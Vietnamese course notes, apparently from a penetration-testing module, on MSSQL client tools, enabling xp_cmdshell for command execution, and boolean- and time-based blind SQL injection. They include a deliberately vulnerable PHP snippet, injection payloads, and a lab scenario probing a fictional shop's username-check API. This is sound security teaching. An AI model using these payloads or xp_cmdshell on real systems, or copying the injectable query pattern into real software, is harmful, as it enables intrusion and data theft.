# 1. MSSQL/SQL Server Introduction

Microsoft SQL Server (MSSQL) là một hệ quản trị cơ sở dữ liệu quan hệ (RDBMS) được sử dụng phổ biến trong các hệ thống doanh nghiệp. Với MSSQL, chúng ta có thể dễ dàng quản lý dữ liệu, truy vấn, và tương tác thông qua các công cụ dòng lệnh hoặc giao diện đồ họa.

Trong module này, chúng ta sẽ tập trung vào các kỹ thuật khai thác SQL injection (SQLi) liên quan đến MSSQL và các cuộc tấn công cụ thể dành cho hệ quản trị này. **Lưu ý:** Đây là module nâng cao, yêu cầu người học đã có kiến thức cơ bản về SQL.

### Các Công Cụ Tương Tác với MSSQL

#### 1. **SQLCMD (Windows, Command Line)**

`SQLCMD` là công cụ dòng lệnh do Microsoft phát triển để tương tác với MSSQL từ hệ điều hành Windows.

**Kết nối với SQL Server:**
```bash
sqlcmd -S 'SQL01' -U 'thomas' -P 'TopSecretPassword23!' -d bsqlintro -W
```

- `-S`: Tên hoặc địa chỉ máy chủ MSSQL.
- `-U`: Tên đăng nhập.
- `-P`: Mật khẩu.
- `-d`: Tên cơ sở dữ liệu.
- `-W`: Xóa khoảng trắng ở cuối mỗi dòng.

**Chạy truy vấn:**
```sql
1> SELECT * FROM INFORMATION_SCHEMA.TABLES;
2> GO
```

**Ví dụ kết quả:**
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
------------- ------------ ---------- -----------
bsqlintro     dbo          users      BASE TABLE
bsqlintro     dbo          posts      BASE TABLE
```

**Truy vấn với `JOIN`:**
```sql
1> SELECT TOP 5 users.firstName, users.lastName, posts.title
2> FROM users
3> JOIN posts ON users.id = posts.authorId;
4> GO
```

**Kết quả:**
```
firstName     lastName      title
------------- ------------- -----------------------------
Edward        Strong        Voluptatem neque labore dolore velit ut.
David         Ladieu        Etincidunt etincidunt adipisci sed consectetur.
Natasha       Ingham        Aliquam quiquia velit non aliquam sed sit.
```

#### 2. **Impacket-MSSQLClient (Linux, Command Line)**

`MSSQLClient.py` là một phần của bộ công cụ `Impacket`, hỗ trợ tương tác với MSSQL từ hệ điều hành Linux, rất hữu ích trong quá trình pentest.

**Kết nối với MSSQL:**
```bash
impacket-mssqlclient thomas:'TopSecretPassword23!'@SQL01 -db bsqlintro
```

- `-db`: Chọn cơ sở dữ liệu mặc định.

**Chạy truy vấn:**
```sql
SQL> SELECT * FROM INFORMATION_SCHEMA.TABLES;
```

**Kích hoạt và sử dụng `xp_cmdshell`:**
```sql
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

**Kết quả:**
```
NT SERVICE\mssqlserver
```

#### 3. **SQL Server Management Studio (SSMS, Windows GUI)**

`SQL Server Management Studio (SSMS)` là công cụ GUI mạnh mẽ giúp người dùng quản lý và tương tác với MSSQL Server. 

**Kết nối đến máy chủ:**
- Mở SSMS, nhập thông tin kết nối bao gồm địa chỉ máy chủ, tên người dùng, và mật khẩu.

**Chạy truy vấn:**
- Nhấp chuột phải vào cơ sở dữ liệu, chọn `New Query`, nhập truy vấn và nhấn `Execute`.

### Khai Thác MSSQL Injection

MSSQL có một số đặc trưng có thể tận dụng khi khai thác SQL Injection:

1. **Sử dụng `xp_cmdshell` để thực thi lệnh hệ thống.**
2. **Sử dụng hàm `sp_configure` để kích hoạt các cấu hình nâng cao.**
3. **Khai thác blind SQLi thông qua các hàm như `WAITFOR DELAY`.**

**Ví dụ khai thác với `xp_cmdshell`:**
```sql
SQL> EXEC xp_cmdshell 'whoami';
```

**Kết quả:**
```
NT SERVICE\mssqlserver
```

---
2
## Blind SQL Injection

### Giới Thiệu

Blind SQL Injection là một dạng tấn công SQL Injection mà kết quả truy vấn SQL không được trả về trực tiếp cho kẻ tấn công. Thay vì nhận được kết quả, kẻ tấn công sẽ dựa vào các khác biệt trong phản hồi của máy chủ (như thời gian phản hồi hoặc nội dung trang) để suy đoán kết quả truy vấn.

Trong tấn công SQL Injection thông thường (Non-Blind SQLi), kẻ tấn công có thể thấy kết quả truy vấn ngay lập tức. Ví dụ, một trang tìm kiếm dễ bị khai thác có thể trả về dữ liệu bằng cách sử dụng payload như:
```sql
UNION SELECT table_name, table_schema FROM information_schema.tables;--
```

Ngược lại, Blind SQL Injection yêu cầu kẻ tấn công phải dựa vào các thay đổi trên trang web hoặc thời gian phản hồi để suy luận kết quả truy vấn.

### Hai Loại Blind SQL Injection

1. **Boolean-based (Content-based) Blind SQL Injection:**
   - Dựa vào sự khác biệt về nội dung phản hồi (ví dụ: chiều dài nội dung) để xác định kết quả truy vấn là **True** hay **False**.
   - Ví dụ: Một form đăng nhập không trả về kết quả truy vấn nhưng sẽ hiển thị thông báo **Email found** nếu truy vấn trả về kết quả, hoặc **Email not found** nếu không có kết quả.

2. **Time-based Blind SQL Injection:**
   - Dựa vào thời gian phản hồi của máy chủ để xác định truy vấn là **True** hay **False**.
   - Kẻ tấn công sẽ chèn các lệnh **SLEEP** hoặc **WAITFOR DELAY** vào truy vấn SQL. Nếu thời gian phản hồi chậm hơn, có thể suy luận rằng truy vấn trả về **True**.

### Ví Dụ về Boolean-based SQL Injection

Dưới đây là ví dụ về một đoạn mã PHP dễ bị tấn công Boolean-based SQL Injection thông qua tham số POST `email`.

**Mã PHP:**
```php
<?php
$connectionInfo = Array("UID" => "db_user", "PWD" => "db_P@55w0rd#", "Database" => "prod");
$conn = sqlsrv_connect("SQL05", $connectionInfo);

$sql = "SELECT * FROM accounts WHERE email = '" . $_POST['email'] . "'";
$stmt = sqlsrv_query($conn, $sql);
$row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC);

if ($row === null) {
    echo "Email not found";
} else {
    echo "Email found";
}
?>
```

**Phân Tích:**
- Đoạn mã trên sử dụng tham số `email` từ người dùng mà không được kiểm tra hoặc lọc sạch, dẫn đến lỗ hổng SQL Injection.
- Kẻ tấn công có thể khai thác bằng cách chèn một payload SQL vào tham số `email` để kiểm tra điều kiện đúng hoặc sai.

**Payload khai thác:**
```sql
' OR 1=1-- 
```

Nếu truy vấn trở thành:
```sql
SELECT * FROM accounts WHERE email = '' OR 1=1--';
```

- Truy vấn luôn đúng (`True`), dẫn đến kết quả là **Email found**.

Ngược lại, với payload:
```sql
' AND 1=2-- 
```

Nếu truy vấn trở thành:
```sql
SELECT * FROM accounts WHERE email = '' AND 1=2--';
```

- Truy vấn luôn sai (`False`), dẫn đến kết quả là **Email not found**.

### Time-based Blind SQL Injection

Trong tấn công Time-based Blind SQL Injection, kẻ tấn công chèn các lệnh làm chậm truy vấn như `SLEEP()` hoặc `WAITFOR DELAY` để đo thời gian phản hồi và xác định kết quả.

**Ví dụ payload:**
```sql
' OR IF(1=1, SLEEP(5), 0)-- 
```

Hoặc đối với MSSQL:
```sql
' OR 1=1; WAITFOR DELAY '0:0:5'-- 
```

**Phân Tích:**
- Nếu thời gian phản hồi của máy chủ chậm hơn (khoảng 5 giây), thì truy vấn đã trả về **True**.
- Nếu không có độ trễ, thì truy vấn trả về **False**.

---
3
## Xác Định Lỗ Hổng Blind SQL Injection

### Bối Cảnh

Chúng ta được thuê bởi **Aunt Maria's Donuts** để tiến hành đánh giá lỗ hổng bảo mật cho trang web của họ. Nhiệm vụ này mô phỏng tình huống tấn công từ bên ngoài, do đó không có thông tin tài khoản người dùng nào được cung cấp. 

Sau khi kiểm tra trang chủ, chúng ta chuyển sang trang đăng ký (registration page) để kiểm tra thêm. Khi nhập tên người dùng, thông báo **The username 'moody' is available** xuất hiện dưới trường nhập liệu. Điều này gợi ý rằng hệ thống có thể đã truy vấn cơ sở dữ liệu để kiểm tra sự tồn tại của tên người dùng.

### Kiểm Tra Tính Năng "Username Availability"

Quan sát mã nguồn của trang **signup.php**, chúng ta thấy trường nhập liệu `usernameInput` gọi hàm **checkUsername()** khi sự kiện **onfocusout** được kích hoạt (khi người dùng chuyển sự tập trung khỏi trường nhập liệu).

Ngoài ra, mã nguồn có tham chiếu đến tệp **static/js/signup.js**. Dưới đây là đoạn mã của hàm **checkUsername()**:

```javascript
function checkUsername() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            var json = JSON.parse(xhr.responseText);
            var username = document.getElementById("usernameInput").value;
            username = username.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
            var usernameHelp = document.getElementById("usernameHelp");

            if (json['status'] === 'available') {
                usernameHelp.innerHTML = "<span style='color:green'>The username '" + username + "' is <b>available</b></span>";
            } else {
                usernameHelp.innerHTML = "<span style='color:red'>The username '" + username + "' is <b>taken</b>, please use a different one</span>";
            }
        }
    };
    xhr.open("GET", "/api/check-username.php?u=" + document.getElementById("usernameInput").value, true);
    xhr.send();
}
```

### Phân Tích Đoạn Mã

Hàm **checkUsername()**:
1. Gửi một yêu cầu **GET** đến URL:
   ```url
   /api/check-username.php?u=<username>
   ```
2. Cập nhật nội dung của phần tử `usernameHelp` để thông báo cho người dùng nếu tên người dùng có sẵn hoặc đã tồn tại, dựa trên phản hồi từ **/api/check-username.php**.

### Khai Thác Lỗ Hổng

Sử dụng công cụ **BurpSuite**, chúng ta có thể kiểm tra một số tên người dùng, ví dụ:
- **admin** và **maria** trả về **status: taken**.
- Khi chúng ta nhập một dấu nháy đơn (`'`), máy chủ trả về **Error 500: Internal Server Error**.

Điều này cho thấy khả năng tồn tại lỗ hổng **SQL Injection**.

### Xác Nhận Lỗ Hổng SQL Injection

Dựa vào lỗi trả về, rất có thể truy vấn SQL được thực hiện trên backend có dạng:

```sql
SELECT Username FROM Users WHERE Username = '<u>'
```

Với truy vấn này, chúng ta có thể thử payload:

```sql
' OR '1'='1
```

Payload này sẽ làm cho truy vấn trở thành:

```sql
SELECT Username FROM Users WHERE Username = '' OR '1'='1'
```

Trong trường hợp này, truy vấn luôn đúng và máy chủ sẽ nghĩ rằng tên người dùng đã tồn tại, trả về kết quả **status: taken**.

### Khai Thác Boolean-based Blind SQL Injection

Vì phản hồi của máy chủ chỉ có hai trạng thái: **status: available** và **status: taken**, chúng ta có thể coi đây là một lỗ hổng **Boolean-based Blind SQL Injection**. Chúng ta sẽ phải sử dụng các câu hỏi **Yes/No** (có/không) để suy luận dữ liệu từ cơ sở dữ liệu.

#### Ví dụ về Khai Thác

Sử dụng công cụ **BurpSuite**, chúng ta có thể gửi yêu cầu với payload sau:

```sql
' OR (SELECT COUNT(*) FROM Users WHERE Username LIKE 'a%') > 0--
```

Nếu máy chủ trả về **status: taken**, điều này cho thấy có ít nhất một tên người dùng bắt đầu bằng chữ **'a'**. Chúng ta có thể tiếp tục thử nghiệm với các ký tự khác và xây dựng một tập lệnh tự động để trích xuất dữ liệu từ cơ sở dữ liệu thông qua các truy vấn Boolean-based Blind SQL Injection.

---
4
